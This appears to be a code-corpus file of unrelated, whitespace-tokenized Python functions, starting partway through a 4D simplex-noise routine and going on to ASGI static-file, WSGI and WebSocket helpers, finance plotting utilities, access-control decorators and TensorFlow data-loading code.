dx7 = dx0 - 1 - 2 * SQUISH_CONSTANT_4D dy7 = dy0 - 0 - 2 * SQUISH_CONSTANT_4D dz7 = dz0 - 0 - 2 * SQUISH_CONSTANT_4D dw7 = dw0 - 1 - 2 * SQUISH_CONSTANT_4D attn7 = 2 - dx7 * dx7 - dy7 * dy7 - dz7 * dz7 - dw7 * dw7 if attn7 > 0 : attn7 *= attn7 value += attn7 * attn7 * extrapolate ( xsb + 1 , ysb + 0 , zsb + 0 , wsb + 1 , dx7 , dy7 , dz7 , dw7 ) # Contribution (0,1,1,0) dx8 = dx0 - 0 - 2 * SQUISH_CONSTANT_4D dy8 = dy0 - 1 - 2 * SQUISH_CONSTANT_4D dz8 = dz0 - 1 - 2 * SQUISH_CONSTANT_4D dw8 = dw0 - 0 - 2 * SQUISH_CONSTANT_4D attn8 = 2 - dx8 * dx8 - dy8 * dy8 - dz8 * dz8 - dw8 * dw8 if attn8 > 0 : attn8 *= attn8 value += attn8 * attn8 * extrapolate ( xsb + 0 , ysb + 1 , zsb + 1 , wsb + 0 , dx8 , dy8 , dz8 , dw8 ) # Contribution (0,1,0,1) dx9 = dx0 - 0 - 2 * SQUISH_CONSTANT_4D dy9 = dy0 - 1 - 2 * SQUISH_CONSTANT_4D dz9 = dz0 - 0 - 2 * SQUISH_CONSTANT_4D dw9 = dw0 - 1 - 2 * SQUISH_CONSTANT_4D attn9 = 2 - dx9 * dx9 - dy9 * dy9 - dz9 * dz9 - dw9 * dw9 if attn9 > 0 : attn9 *= attn9 value += attn9 * attn9 * extrapolate ( xsb + 0 , ysb + 1 , zsb + 0 , wsb + 1 , dx9 , dy9 , dz9 , dw9 ) # Contribution (0,0,1,1) dx10 = dx0 - 0 - 2 * SQUISH_CONSTANT_4D dy10 = dy0 - 0 - 2 * SQUISH_CONSTANT_4D dz10 = dz0 - 1 - 2 * SQUISH_CONSTANT_4D dw10 = dw0 - 1 - 2 * SQUISH_CONSTANT_4D attn10 = 2 - dx10 * dx10 - dy10 * dy10 - dz10 * dz10 - dw10 * dw10 if attn10 > 0 : attn10 *= attn10 value += attn10 * attn10 * extrapolate ( xsb + 0 , ysb + 0 , zsb + 1 , wsb + 1 , dx10 , dy10 , dz10 , dw10 ) else : # We're inside the second dispentachoron (Rectified 4-Simplex) a_is_bigger_side = True b_is_bigger_side = True # Decide between (0,0,1,1) and (1,1,0,0) if xins + yins < zins + wins : a_score = xins + yins a_po = 0x0C else : a_score = zins + wins a_po = 0x03 # Decide between (0,1,0,1) and (1,0,1,0) if xins + zins < yins + wins : b_score = xins + zins b_po = 0x0A else : b_score = yins + wins b_po = 0x05 # Closer between (0,1,1,0) and (1,0,0,1) will replace the further of a and b, if closer. if xins + wins < yins + zins : score = xins + wins if a_score <= b_score and score < b_score : b_score = score b_po = 0x06 elif a_score > b_score and score < a_score : a_score = score a_po = 0x06 else : score = yins + zins if a_score <= b_score and score < b_score : b_score = score b_po = 0x09 elif a_score > b_score and score < a_score : a_score = score a_po = 0x09 # Decide if (0,1,1,1) is closer. p1 = 3 - in_sum + xins if a_score <= b_score and p1 < b_score : b_score = p1 b_po = 0x0E b_is_bigger_side = False elif a_score > b_score and p1 < a_score : a_score = p1 a_po = 0x0E a_is_bigger_side = False # Decide if (1,0,1,1) is closer. p2 = 3 - in_sum + yins if a_score <= b_score and p2 < b_score : b_score = p2 b_po = 0x0D b_is_bigger_side = False elif a_score > b_score and p2 < a_score : a_score = p2 a_po = 0x0D a_is_bigger_side = False # Decide if (1,1,0,1) is closer. p3 = 3 - in_sum + zins if a_score <= b_score and p3 < b_score : b_score = p3 b_po = 0x0B b_is_bigger_side = False elif a_score > b_score and p3 < a_score : a_score = p3 a_po = 0x0B a_is_bigger_side = False # Decide if (1,1,1,0) is closer. p4 = 3 - in_sum + wins if a_score <= b_score and p4 < b_score : b_po = 0x07 b_is_bigger_side = False elif a_score > b_score and p4 < a_score : a_po = 0x07 a_is_bigger_side = False # Where each of the two closest pos are determines how the extra three vertices are calculated. if a_is_bigger_side == b_is_bigger_side : if a_is_bigger_side : # Both closest pos on the bigger side c1 = ( a_po & b_po ) c2 = ( a_po | b_po ) # Two contributions are _permutations of (0,0,0,1) and (0,0,0,2) based on c1 xsv_ext0 = xsv_ext1 = xsb ysv_ext0 = ysv_ext1 = ysb zsv_ext0 = zsv_ext1 = zsb wsv_ext0 = wsv_ext1 = wsb dx_ext0 = dx0 - SQUISH_CONSTANT_4D dy_ext0 = dy0 - SQUISH_CONSTANT_4D dz_ext0 = dz0 - SQUISH_CONSTANT_4D dw_ext0 = dw0 - SQUISH_CONSTANT_4D dx_ext1 = dx0 - 2 * SQUISH_CONSTANT_4D dy_ext1 = dy0 - 2 * SQUISH_CONSTANT_4D dz_ext1 = dz0 - 2 * SQUISH_CONSTANT_4D dw_ext1 = dw0 - 2 * SQUISH_CONSTANT_4D if ( c1 & 0x01 ) != 0 : xsv_ext0 += 1 dx_ext0 -= 1 xsv_ext1 += 2 dx_ext1 -= 2 elif ( c1 & 0x02 ) != 0 : ysv_ext0 += 1 dy_ext0 -= 1 ysv_ext1 += 2 dy_ext1 -= 2 elif ( c1 & 0x04 ) != 0 : zsv_ext0 += 1 dz_ext0 -= 1 zsv_ext1 += 2 dz_ext1 -= 2 else : wsv_ext0 += 1 dw_ext0 -= 1 wsv_ext1 += 2 dw_ext1 -= 2 # One contribution is a _permutation of (1,1,1,-1) based on c2 xsv_ext2 = xsb + 1 ysv_ext2 = ysb + 1 zsv_ext2 = zsb + 1 wsv_ext2 = wsb + 1 dx_ext2 = dx0 - 1 - 2 * SQUISH_CONSTANT_4D dy_ext2 = dy0 - 1 - 2 * SQUISH_CONSTANT_4D dz_ext2 = dz0 - 1 - 2 * SQUISH_CONSTANT_4D dw_ext2 = dw0 - 1 - 2 * SQUISH_CONSTANT_4D if ( c2 & 0x01 ) == 0 : xsv_ext2 -= 2 dx_ext2 += 2 elif ( c2 & 0x02 ) == 0 : ysv_ext2 -= 2 dy_ext2 += 2 elif ( c2 & 0x04 ) == 0 : zsv_ext2 -= 2 dz_ext2 += 2 else : wsv_ext2 -= 2 dw_ext2 += 2 else : # Both closest pos on the smaller side # One of the two extra pos is (1,1,1,1) xsv_ext2 = xsb + 1 ysv_ext2 = ysb + 1 zsv_ext2 = zsb + 1 wsv_ext2 = wsb + 1 dx_ext2 = dx0 - 1 - 4 * SQUISH_CONSTANT_4D dy_ext2 = dy0 - 1 - 4 * SQUISH_CONSTANT_4D dz_ext2 = dz0 - 1 - 4 * SQUISH_CONSTANT_4D dw_ext2 = dw0 - 1 - 4 * SQUISH_CONSTANT_4D # Other two pos are based on the shared axes. c = ( a_po & b_po ) if ( c & 0x01 ) != 0 : xsv_ext0 = xsb + 2 xsv_ext1 = xsb + 1 dx_ext0 = dx0 - 2 - 3 * SQUISH_CONSTANT_4D dx_ext1 = dx0 - 1 - 3 * SQUISH_CONSTANT_4D else : xsv_ext0 = xsv_ext1 = xsb dx_ext0 = dx_ext1 = dx0 - 3 * SQUISH_CONSTANT_4D if ( c & 0x02 ) != 0 : ysv_ext0 = ysv_ext1 = ysb + 1 dy_ext0 = dy_ext1 = dy0 - 1 - 3 * SQUISH_CONSTANT_4D if ( c & 0x01 ) == 0 : ysv_ext0 += 1 dy_ext0 -= 1 else : ysv_ext1 += 1 dy_ext1 -= 1 else : ysv_ext0 = ysv_ext1 = ysb dy_ext0 = dy_ext1 = dy0 - 3 * SQUISH_CONSTANT_4D if ( c & 0x04 ) != 0 : zsv_ext0 = zsv_ext1 = zsb + 1 dz_ext0 = dz_ext1 = dz0 - 1 - 3 * SQUISH_CONSTANT_4D if ( c & 0x03 ) == 0 : zsv_ext0 += 1 dz_ext0 -= 1 else : zsv_ext1 += 1 dz_ext1 -= 1 else : zsv_ext0 = zsv_ext1 = zsb dz_ext0 = dz_ext1 = dz0 - 3 * SQUISH_CONSTANT_4D if ( c & 0x08 ) != 0 : wsv_ext0 = wsb + 1 wsv_ext1 = wsb + 2 dw_ext0 = dw0 - 1 - 3 * SQUISH_CONSTANT_4D dw_ext1 = dw0 - 2 - 3 * SQUISH_CONSTANT_4D else : wsv_ext0 = wsv_ext1 = wsb dw_ext0 = dw_ext1 = dw0 - 3 * SQUISH_CONSTANT_4D else : # One po on each "side" if a_is_bigger_side : c1 = a_po c2 = b_po else : c1 = b_po c2 = a_po # Two contributions are the bigger-sided po with each 1 replaced with 2. if ( c1 & 0x01 ) != 0 : xsv_ext0 = xsb + 2 xsv_ext1 = xsb + 1 dx_ext0 = dx0 - 2 - 3 * SQUISH_CONSTANT_4D dx_ext1 = dx0 - 1 - 3 * SQUISH_CONSTANT_4D else : xsv_ext0 = xsv_ext1 = xsb dx_ext0 = dx_ext1 = dx0 - 3 * SQUISH_CONSTANT_4D if ( c1 & 0x02 ) != 0 : ysv_ext0 = ysv_ext1 = ysb + 1 dy_ext0 = dy_ext1 = dy0 - 1 - 3 * SQUISH_CONSTANT_4D if ( c1 & 0x01 ) == 0 : ysv_ext0 += 1 dy_ext0 -= 1 else : ysv_ext1 += 1 dy_ext1 -= 1 else : ysv_ext0 = ysv_ext1 = ysb dy_ext0 = dy_ext1 = dy0 - 3 * SQUISH_CONSTANT_4D if ( c1 & 0x04 ) != 0 : zsv_ext0 = zsv_ext1 = zsb + 1 dz_ext0 = dz_ext1 = dz0 - 1 - 3 * SQUISH_CONSTANT_4D if ( c1 & 0x03 ) == 0 : zsv_ext0 += 1 dz_ext0 -= 1 else : zsv_ext1 += 1 dz_ext1 -= 1 else : zsv_ext0 = zsv_ext1 = zsb dz_ext0 = dz_ext1 = dz0 - 3 * SQUISH_CONSTANT_4D if ( c1 & 0x08 ) != 0 : wsv_ext0 = wsb + 1 wsv_ext1 = wsb + 2 dw_ext0 = dw0 - 1 - 3 * SQUISH_CONSTANT_4D dw_ext1 = dw0 - 2 - 3 * SQUISH_CONSTANT_4D else : wsv_ext0 = wsv_ext1 = wsb dw_ext0 = dw_ext1 = dw0 - 3 * SQUISH_CONSTANT_4D # One contribution is a _permutation of (1,1,1,-1) based on the smaller-sided po xsv_ext2 = xsb + 1 ysv_ext2 = ysb + 1 zsv_ext2 = zsb + 1 wsv_ext2 = wsb + 1 dx_ext2 = dx0 - 1 - 2 * SQUISH_CONSTANT_4D dy_ext2 = dy0 - 1 - 2 * SQUISH_CONSTANT_4D dz_ext2 = dz0 - 1 - 2 * SQUISH_CONSTANT_4D dw_ext2 = dw0 - 1 - 2 * SQUISH_CONSTANT_4D if ( c2 & 0x01 ) == 0 : xsv_ext2 -= 2 dx_ext2 += 2 elif ( c2 & 0x02 ) == 0 : ysv_ext2 -= 2 dy_ext2 += 2 elif ( c2 & 0x04 ) == 0 : zsv_ext2 -= 2 dz_ext2 += 2 else : wsv_ext2 -= 2 dw_ext2 += 2 # Contribution (1,1,1,0) dx4 = dx0 - 1 - 3 * SQUISH_CONSTANT_4D dy4 = dy0 - 1 - 3 * SQUISH_CONSTANT_4D dz4 = dz0 - 1 - 3 * SQUISH_CONSTANT_4D dw4 = dw0 - 3 * SQUISH_CONSTANT_4D attn4 = 2 - dx4 * dx4 - dy4 * dy4 - dz4 * dz4 - dw4 * dw4 if attn4 > 0 : attn4 *= attn4 value += attn4 * attn4 * extrapolate ( xsb + 1 , ysb + 1 , zsb + 1 , wsb + 0 , dx4 , dy4 , dz4 , dw4 ) # Contribution (1,1,0,1) dx3 = dx4 dy3 = dy4 dz3 = dz0 - 3 * SQUISH_CONSTANT_4D dw3 = dw0 - 1 - 3 * SQUISH_CONSTANT_4D attn3 = 2 - dx3 * dx3 - dy3 * dy3 - dz3 * dz3 - dw3 * dw3 if attn3 > 0 : attn3 *= attn3 value += attn3 * attn3 * extrapolate ( xsb + 1 , ysb + 1 , zsb + 0 , wsb + 1 , dx3 , dy3 , dz3 , dw3 ) # Contribution (1,0,1,1) dx2 = dx4 dy2 = dy0 - 3 * SQUISH_CONSTANT_4D dz2 = dz4 dw2 = dw3 attn2 = 2 - dx2 * dx2 - dy2 * dy2 - dz2 * dz2 - dw2 * dw2 if attn2 > 0 : attn2 *= attn2 value += attn2 * attn2 * extrapolate ( xsb + 1 , ysb + 0 , zsb + 1 , wsb + 1 , dx2 , dy2 , dz2 , dw2 ) # Contribution (0,1,1,1) dx1 = dx0 - 3 * SQUISH_CONSTANT_4D dz1 = dz4 dy1 = dy4 dw1 = dw3 attn1 = 2 - dx1 * dx1 - dy1 * dy1 - dz1 * dz1 - dw1 * dw1 if attn1 > 0 : attn1 *= attn1 value += attn1 * attn1 * extrapolate ( xsb + 0 , ysb + 1 , zsb + 1 , wsb + 1 , dx1 , dy1 , dz1 , dw1 ) # Contribution (1,1,0,0) dx5 = dx0 - 1 - 2 * SQUISH_CONSTANT_4D dy5 = dy0 - 1 - 2 * SQUISH_CONSTANT_4D dz5 = dz0 - 0 - 2 * SQUISH_CONSTANT_4D dw5 = dw0 - 0 - 2 * SQUISH_CONSTANT_4D attn5 = 2 - dx5 * dx5 - dy5 * dy5 - dz5 * dz5 - dw5 * dw5 if attn5 > 0 : attn5 *= attn5 value += attn5 * attn5 * extrapolate ( xsb + 1 , ysb + 1 , zsb + 0 , wsb + 0 , dx5 , dy5 , dz5 , dw5 ) # Contribution (1,0,1,0) dx6 = dx0 - 1 - 2 * SQUISH_CONSTANT_4D dy6 = dy0 - 0 - 2 * SQUISH_CONSTANT_4D dz6 = dz0 - 1 - 2 * SQUISH_CONSTANT_4D dw6 = dw0 - 0 - 2 * SQUISH_CONSTANT_4D attn6 = 2 - dx6 * dx6 - dy6 * dy6 - dz6 * dz6 - dw6 * dw6 if attn6 > 0 : attn6 *= attn6 value += attn6 * attn6 * extrapolate ( xsb + 1 , ysb + 0 , zsb + 1 , wsb + 0 , dx6 , dy6 , dz6 , dw6 ) # Contribution (1,0,0,1) dx7 = dx0 - 1 - 2 * SQUISH_CONSTANT_4D dy7 = dy0 - 0 - 2 * SQUISH_CONSTANT_4D dz7 = dz0 - 0 - 2 * SQUISH_CONSTANT_4D dw7 = dw0 - 1 - 2 * SQUISH_CONSTANT_4D attn7 = 2 - dx7 * dx7 - dy7 * dy7 - dz7 * dz7 - dw7 * dw7 if attn7 > 0 : attn7 *= attn7 value += attn7 * attn7 * extrapolate ( xsb + 1 , ysb + 0 , zsb + 0 , wsb + 1 , dx7 , dy7 , dz7 , dw7 ) # Contribution (0,1,1,0) dx8 = dx0 - 0 - 2 * SQUISH_CONSTANT_4D dy8 = dy0 - 1 - 2 * SQUISH_CONSTANT_4D dz8 = dz0 - 1 - 2 * SQUISH_CONSTANT_4D dw8 = dw0 - 0 - 2 * SQUISH_CONSTANT_4D attn8 = 2 - dx8 * dx8 - dy8 * dy8 - dz8 * dz8 - dw8 * dw8 if attn8 > 0 : attn8 *= attn8 value += attn8 * attn8 * extrapolate ( xsb + 0 , ysb + 1 , zsb + 1 , wsb + 0 , dx8 , dy8 , dz8 , dw8 ) # Contribution (0,1,0,1) dx9 = dx0 - 0 - 2 * SQUISH_CONSTANT_4D dy9 = dy0 - 1 - 2 * SQUISH_CONSTANT_4D dz9 = dz0 - 0 - 2 * SQUISH_CONSTANT_4D dw9 = dw0 - 1 - 2 * SQUISH_CONSTANT_4D attn9 = 2 - dx9 * dx9 - dy9 * dy9 - dz9 * dz9 - dw9 * dw9 if attn9 > 0 : attn9 *= attn9 value += attn9 * attn9 * extrapolate ( xsb + 0 , ysb + 1 , zsb + 0 , wsb + 1 , dx9 , dy9 , dz9 , dw9 ) # Contribution (0,0,1,1) dx10 = dx0 - 0 - 2 * SQUISH_CONSTANT_4D dy10 = dy0 - 0 - 2 * SQUISH_CONSTANT_4D dz10 = dz0 - 1 - 2 * SQUISH_CONSTANT_4D dw10 = dw0 - 1 - 2 * SQUISH_CONSTANT_4D attn10 = 2 - dx10 * dx10 - dy10 * dy10 - dz10 * dz10 - dw10 * dw10 if attn10 > 0 : attn10 *= attn10 value += attn10 * attn10 * extrapolate ( xsb + 0 , ysb + 0 , zsb + 1 , wsb + 1 , dx10 , dy10 , dz10 , dw10 ) # First extra vertex attn_ext0 = 2 - dx_ext0 * dx_ext0 - dy_ext0 * dy_ext0 - dz_ext0 * dz_ext0 - dw_ext0 * dw_ext0 if attn_ext0 > 0 : attn_ext0 *= attn_ext0 value += attn_ext0 * attn_ext0 * extrapolate ( xsv_ext0 , ysv_ext0 , zsv_ext0 , wsv_ext0 , dx_ext0 , dy_ext0 , dz_ext0 , dw_ext0 ) # Second extra vertex attn_ext1 = 2 - dx_ext1 * dx_ext1 - dy_ext1 * dy_ext1 - dz_ext1 * dz_ext1 - dw_ext1 * dw_ext1 if attn_ext1 > 0 : attn_ext1 *= attn_ext1 value += attn_ext1 * attn_ext1 * extrapolate ( xsv_ext1 , ysv_ext1 , zsv_ext1 , wsv_ext1 , dx_ext1 , dy_ext1 , dz_ext1 , dw_ext1 ) # Third extra vertex attn_ext2 = 2 - dx_ext2 * dx_ext2 - dy_ext2 * dy_ext2 - dz_ext2 * dz_ext2 - dw_ext2 * dw_ext2 if attn_ext2 > 0 : attn_ext2 *= attn_ext2 value += attn_ext2 * attn_ext2 * extrapolate ( xsv_ext2 , ysv_ext2 , zsv_ext2 , wsv_ext2 , dx_ext2 , dy_ext2 , dz_ext2 , dw_ext2 ) return value / NORM_CONSTANT_4D
def InColorspace ( to_colorspace , from_colorspace = "RGB" , children = None , name = None , deterministic = False , random_state = None ) : return WithColorspace ( to_colorspace , from_colorspace , children , name , deterministic , random_state )
def height ( self ) : if len ( self . coords ) <= 1 : return 0 return np . max ( self . yy ) - np . min ( self . yy )
def width ( self ) : if len ( self . coords ) <= 1 : return 0 return np . max ( self . xx ) - np . min ( self . xx )
def offer ( self , p , e : Event ) : existing = self . events_scan . setdefault ( p , ( [ ] , [ ] , [ ] , [ ] ) if USE_VERTICAL else ( [ ] , [ ] , [ ] ) ) # Can use double linked-list for easy insertion at beginning/end existing [ e . type ] . append ( e )
def append ( self , key : str , value : str ) -> None : append_key = key . lower ( ) . encode ( "latin-1" ) append_value = value . encode ( "latin-1" ) self . _list . append ( ( append_key , append_value ) )
def parse_docstring ( self , func_or_method : typing . Callable ) -> dict : docstring = func_or_method . __doc__ if not docstring : return { } # We support having regular docstrings before the schema # definition. Here we return just the schema part from # the docstring. docstring = docstring . split ( "---" ) [ - 1 ] parsed = yaml . safe_load ( docstring ) if not isinstance ( parsed , dict ) : # A regular docstring (not yaml formatted) can return # a simple string here, which wouldn't follow the schema. return { } return parsed
async def get_response ( self , path : str , scope : Scope ) -> Response : if scope [ "method" ] not in ( "GET" , "HEAD" ) : return PlainTextResponse ( "Method Not Allowed" , status_code = 405 ) if path . startswith ( ".." ) : # Most clients will normalize the path, so we shouldn't normally # get this, but don't allow misbehaving clients to break out of # the static files directory. return PlainTextResponse ( "Not Found" , status_code = 404 ) full_path , stat_result = await self . lookup_path ( path ) if stat_result and stat . S_ISREG ( stat_result . st_mode ) : # We have a static file to serve. return self . file_response ( full_path , stat_result , scope ) elif stat_result and stat . S_ISDIR ( stat_result . st_mode ) and self . html : # We're in HTML mode, and have got a directory URL. # Check if we have 'index.html' file to serve. index_path = os . path . join ( path , "index.html" ) full_path , stat_result = await self . lookup_path ( index_path ) if stat_result is not None and stat . S_ISREG ( stat_result . st_mode ) : if not scope [ "path" ] . endswith ( "/" ) : # Directory URLs should redirect to always end in "/". url = URL ( scope = scope ) url = url . replace ( path = url . path + "/" ) return RedirectResponse ( url = url ) return self . file_response ( full_path , stat_result , scope ) if self . html : # Check for '404.html' if we're in HTML mode. full_path , stat_result = await self . lookup_path ( "404.html" ) if stat_result is not None and stat . S_ISREG ( stat_result . st_mode ) : return self . file_response ( full_path , stat_result , scope , status_code = 404 ) return PlainTextResponse ( "Not Found" , status_code = 404 )
def build_environ ( scope : Scope , body : bytes ) -> dict : environ = { "REQUEST_METHOD" : scope [ "method" ] , "SCRIPT_NAME" : scope . get ( "root_path" , "" ) , "PATH_INFO" : scope [ "path" ] , "QUERY_STRING" : scope [ "query_string" ] . decode ( "ascii" ) , "SERVER_PROTOCOL" : f"HTTP/{scope['http_version']}" , "wsgi.version" : ( 1 , 0 ) , "wsgi.url_scheme" : scope . get ( "scheme" , "http" ) , "wsgi.input" : io . BytesIO ( body ) , "wsgi.errors" : sys . stdout , "wsgi.multithread" : True , "wsgi.multiprocess" : True , "wsgi.run_once" : False , } # Get server name and port - required in WSGI, not in ASGI server = scope . get ( "server" ) or ( "localhost" , 80 ) environ [ "SERVER_NAME" ] = server [ 0 ] environ [ "SERVER_PORT" ] = server [ 1 ] # Get client IP address if scope . get ( "client" ) : environ [ "REMOTE_ADDR" ] = scope [ "client" ] [ 0 ] # Go through headers and make them into environ entries for name , value in scope . get ( "headers" , [ ] ) : name = name . decode ( "latin1" ) if name == "content-length" : corrected_name = "CONTENT_LENGTH" elif name == "content-type" : corrected_name = "CONTENT_TYPE" else : corrected_name = f"HTTP_{name}" . upper ( ) . replace ( "-" , "_" ) # HTTPbis say only ASCII chars are allowed in headers, but we latin1 just in case value = value . decode ( "latin1" ) if corrected_name in environ : value = environ [ corrected_name ] + "," + value environ [ corrected_name ] = value return environ
async def receive ( self ) -> Message : if self . client_state == WebSocketState . CONNECTING : message = await self . _receive ( ) message_type = message [ "type" ] assert message_type == "websocket.connect" self . client_state = WebSocketState . CONNECTED return message elif self . client_state == WebSocketState . CONNECTED : message = await self . _receive ( ) message_type = message [ "type" ] assert message_type in { "websocket.receive" , "websocket.disconnect" } if message_type == "websocket.disconnect" : self . client_state = WebSocketState . DISCONNECTED return message else : raise RuntimeError ( 'Cannot call "receive" once a disconnect message has been received.' )
async def send ( self , message : Message ) -> None : if self . application_state == WebSocketState . CONNECTING : message_type = message [ "type" ] assert message_type in { "websocket.accept" , "websocket.close" } if message_type == "websocket.close" : self . application_state = WebSocketState . DISCONNECTED else : self . application_state = WebSocketState . CONNECTED await self . _send ( message ) elif self . application_state == WebSocketState . CONNECTED : message_type = message [ "type" ] assert message_type in { "websocket.send" , "websocket.close" } if message_type == "websocket.close" : self . application_state = WebSocketState . DISCONNECTED await self . _send ( message ) else : raise RuntimeError ( 'Cannot call "send" once a close message has been sent.' )
def _cumulative_returns_less_costs ( returns , costs ) : if costs is None : return ep . cum_returns ( returns ) return ep . cum_returns ( returns - costs )
def to_utc ( df ) : try : df . index = df . index . tz_localize ( 'UTC' ) except TypeError : df . index = df . index . tz_convert ( 'UTC' ) return df
def sample_colormap ( cmap_name , n_samples ) : colors = [ ] colormap = cm . cmap_d [ cmap_name ] for i in np . linspace ( 0 , 1 , n_samples ) : colors . append ( colormap ( i ) ) return colors
def customize ( func ) : @ wraps ( func ) def call_w_context ( * args , * * kwargs ) : set_context = kwargs . pop ( 'set_context' , True ) if set_context : with plotting_context ( ) , axes_style ( ) : return func ( * args , * * kwargs ) else : return func ( * args , * * kwargs ) return call_w_context
def private_method ( func ) : def func_wrapper ( * args , * * kwargs ) : """Decorator wrapper function.""" outer_frame = inspect . stack ( ) [ 1 ] [ 0 ] if 'self' not in outer_frame . f_locals or outer_frame . f_locals [ 'self' ] is not args [ 0 ] : raise RuntimeError ( '%s.%s is a private method' % ( args [ 0 ] . __class__ . __name__ , func . __name__ ) ) return func ( * args , * * kwargs ) return func_wrapper
def protected_method ( func ) : def func_wrapper ( * args , * * kwargs ) : """Decorator wrapper function.""" outer_frame = inspect . stack ( ) [ 1 ] [ 0 ] caller = inspect . getmro ( outer_frame . f_locals [ 'self' ] . __class__ ) [ : - 1 ] target = inspect . getmro ( args [ 0 ] . __class__ ) [ : - 1 ] share_subsclass = False for cls_ in target : if issubclass ( caller [ 0 ] , cls_ ) or caller [ 0 ] is cls_ : share_subsclass = True break if ( 'self' not in outer_frame . f_locals or outer_frame . f_locals [ 'self' ] is not args [ 0 ] ) and ( not share_subsclass ) : raise RuntimeError ( '%s.%s is a protected method' % ( args [ 0 ] . __class__ . __name__ , func . __name__ ) ) return func ( * args , * * kwargs ) return func_wrapper
def log_if ( level , msg , condition , * args ) : if condition : vlog ( level , msg , * args )
def google2_log_prefix ( level , timestamp = None , file_and_line = None ) : # pylint: disable=global-variable-not-assigned global _level_names # pylint: enable=global-variable-not-assigned # Record current time now = timestamp or _time . time ( ) now_tuple = _time . localtime ( now ) now_microsecond = int ( 1e6 * ( now % 1.0 ) ) ( filename , line ) = file_and_line or _GetFileAndLine ( ) basename = _os . path . basename ( filename ) # Severity string severity = 'I' if level in _level_names : severity = _level_names [ level ] [ 0 ] s = '%c%02d%02d %02d: %02d: %02d.%06d %5d %s: %d] ' % ( severity , now_tuple [ 1 ] , # month now_tuple [ 2 ] , # day now_tuple [ 3 ] , # hour now_tuple [ 4 ] , # min now_tuple [ 5 ] , # sec now_microsecond , _get_thread_id ( ) , basename , line ) return s
def validation_metrics ( self ) : if ( self . _validation_iterator is None ) or ( self . _validation_metrics is None ) : raise AttributeError ( 'Validation is not setup.' ) n = 0.0 metric_sums = [ 0.0 ] * len ( self . _validation_metrics ) self . _sess . run ( self . _validation_iterator . initializer ) while True : try : metrics = self . _sess . run ( self . _validation_metrics ) for i , m in enumerate ( metrics ) : metric_sums [ i ] += m n += 1.0 except tf . errors . OutOfRangeError : break for i , m in enumerate ( metric_sums ) : metric_sums [ i ] = metric_sums [ i ] / n return zip ( self . _validation_metrics , metric_sums )
def retrieve_seq_length_op3 ( data , pad_val = 0 ) : # HangSheng: return tensor for sequence length, if input is tf.string data_shape_size = data . get_shape ( ) . ndims if data_shape_size == 3 : return tf . reduce_sum ( tf . cast ( tf . reduce_any ( tf . not_equal ( data , pad_val ) , axis = 2 ) , dtype = tf . int32 ) , 1 ) elif data_shape_size == 2 : return tf . reduce_sum ( tf . cast ( tf . not_equal ( data , pad_val ) , dtype = tf . int32 ) , 1 ) elif data_shape_size == 1 : raise ValueError ( "retrieve_seq_length_op3: data has wrong shape!" ) else : raise ValueError ( "retrieve_seq_length_op3: handling data_shape_size %s hasn't been implemented!" % ( data_shape_size ) )
def state_size ( self ) : return ( LSTMStateTuple ( self . _num_units , self . _num_units ) if self . _state_is_tuple else 2 * self . _num_units )
def _tf_repeat ( self , a , repeats ) : if len ( a . get_shape ( ) ) != 1 : raise AssertionError ( "This is not a 1D Tensor" ) a = tf . expand_dims ( a , - 1 ) a = tf . tile ( a , [ 1 , repeats ] ) a = self . tf_flatten ( a ) return a
def augment_with_ngrams ( unigrams , unigram_vocab_size , n_buckets , n = 2 ) : def get_ngrams ( n ) : return list ( zip ( * [ unigrams [ i : ] for i in range ( n ) ] ) ) def hash_ngram ( ngram ) : bytes_ = array . array ( 'L' , ngram ) . tobytes ( ) hash_ = int ( hashlib . sha256 ( bytes_ ) . hexdigest ( ) , 16 ) return unigram_vocab_size + hash_ % n_buckets return unigrams + [ hash_ngram ( ngram ) for i in range ( 2 , n + 1 ) for ngram in get_ngrams ( i ) ]
def load_and_preprocess_imdb_data ( n_gram = None ) : X_train , y_train , X_test , y_test = tl . files . load_imdb_dataset ( nb_words = VOCAB_SIZE ) if n_gram is not None : X_train = np . array ( [ augment_with_ngrams ( x , VOCAB_SIZE , N_BUCKETS , n = n_gram ) for x in X_train ] ) X_test = np . array ( [ augment_with_ngrams ( x , VOCAB_SIZE , N_BUCKETS , n = n_gram ) for x in X_test ] ) return X_train , y_train , X_test , y_test
def data_to_tfrecord ( images , labels , filename ) : if os . path . isfile ( filename ) : print ( "%s exists" % filename ) return print ( "Converting data into %s ..." % filename ) # cwd = os.getcwd() writer = tf . python_io . TFRecordWriter ( filename ) for index , img in enumerate ( images ) : img_raw = img . tobytes ( ) # Visualize a image # tl.visualize.frame(np.asarray(img, dtype=np.uint8), second=1, saveable=False, name='frame', fig_idx=1236) label = int ( labels [ index ] ) # print(label) # Convert the bytes back to image as follow: # image = Image.frombytes('RGB', (32, 32), img_raw) # image = np.fromstring(img_raw, np.float32) # image = image.reshape([32, 32, 3]) # tl.visualize.frame(np.asarray(image, dtype=np.uint8), second=1, saveable=False, name='frame', fig_idx=1236) example = tf . train . Example ( features = tf . train . Features ( feature = { "label" : tf . train . Feature ( int64_list = tf . train . Int64List ( value = [ label ] ) ) , 'img_raw' : tf . train . Feature ( bytes_list = tf . train . BytesList ( value = [ img_raw ] ) ) , } ) ) writer . write ( example . SerializeToString ( ) ) # Serialize To String writer . close ( )
def read_and_decode ( filename , is_train = None ) : filename_queue = tf . train . string_input_producer ( [ filename ] ) reader = tf . TFRecordReader ( ) _ , serialized_example = reader . read ( filename_queue ) features = tf . parse_single_example ( serialized_example , features = { 'label' : tf . FixedLenFeature ( [ ] , tf . int64 ) , 'img_raw' : tf . FixedLenFeature ( [ ] , tf . string ) , } ) # You can do more image distortion here for training data img = tf . decode_raw ( features [ 'img_raw' ] , tf . float32 ) img = tf . reshape ( img , [ 32 , 32 , 3 ] ) # img = tf.cast(img, tf.float32) #* (1. / 255) - 0.5 if is_train == True : # 1. Randomly crop a [height, width] section of the image. img = tf . random_crop ( img , [ 24 , 24 , 3 ] ) # 2. Randomly flip the image horizontally. img = tf . image . random_flip_left_right ( img ) # 3. Randomly change brightness. img = tf . image . random_brightness ( img , max_delta = 63 ) # 4. Randomly change contrast. img = tf . image . random_contrast ( img , lower = 0.2 , upper = 1.8 ) # 5. Subtract off the mean and divide by the variance of the pixels. img = tf . image . per_image_standardization ( img ) elif is_train == False : # 1. Crop the central [height, width] of the image. img = tf . image . resize_image_with_crop_or_pad ( img , 24 , 24 ) # 2. Subtract off the mean and divide by the variance of the pixels. img = tf . image . per_image_standardization ( img ) elif is_train == None : img = img label = tf . cast ( features [ 'label' ] , tf . int32 ) return img , label
